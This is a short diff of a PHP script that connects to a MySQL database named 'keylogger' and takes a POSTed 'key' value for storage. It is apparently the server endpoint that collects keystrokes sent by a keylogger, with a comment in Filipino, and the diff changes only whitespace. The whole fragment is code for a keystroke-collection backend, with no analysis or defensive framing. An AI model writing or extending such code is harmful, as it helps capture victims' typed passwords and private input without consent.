@@ -7,9 +7,9 @@ $dbname = "keylogger";
 $conn = new mysqli($host, $user, $pass, $dbname);
 
 if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
+    die("Connection failed: " . $conn->connect_error); 
 }
-
+ 
 // Kung may ginpadala nga 'key'
 if (isset($_POST['key'])) {
     $key = $conn->real_escape_string($_POST['key']);
